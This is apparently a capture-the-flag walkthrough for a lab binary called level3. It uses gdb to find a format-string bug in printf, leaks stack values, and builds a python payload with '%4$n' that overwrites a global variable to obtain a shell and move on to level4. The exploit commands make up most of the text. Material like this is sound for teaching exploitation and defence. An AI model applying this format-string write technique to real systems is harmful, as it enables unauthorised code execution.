# Level3 Walkthrough

## Analyzing the Program with GDB or Ghidra and Running the program

1. **Disassemble the `main` function**:
    - `watch source.c`
    - Focus on v() function: we can see a call to fgets() which is protect against buffer overflow attack but we can see a printf() function call which is vulnerable to format string exploit.

    ```
    gdb ./level3
    info functions
    b v
    run
    info variables
    p &m
    ```

    - We can see that the address of m is : `804988c` so we'll have to change the value.

    - Purpose is to change the content of the variable `m` it has to have 64bytes (0x40): 
        - address of `m` : 4bytes
        - buffer padding : 60 bytes more

2. **Format String Vulnerability**
    - Need to print number of bytes, and the address.
        ```
        python -c 'print "\x8c\x98\x04\x08" + " %x "* 10' > /tmp/exploit3
        cat /tmp/exploit3 | ./level3
        200 b7fd1ac0 b7ff37d0 804988c
        ```
    - So, the address of m is at the 4th position, so now...
    
3. **Final Fight**
    - We can see "Wait what?!" with `python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' | ./level3` so lets put it in a file
    ```
    python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit3
    cat /tmp/exploit3 - | ./level3
    ```

## Moving to level4

1. **Swith User to level4**:
    Run ```su level4```

2. **Authenticate with the Password**:
    We used the password we found on flag.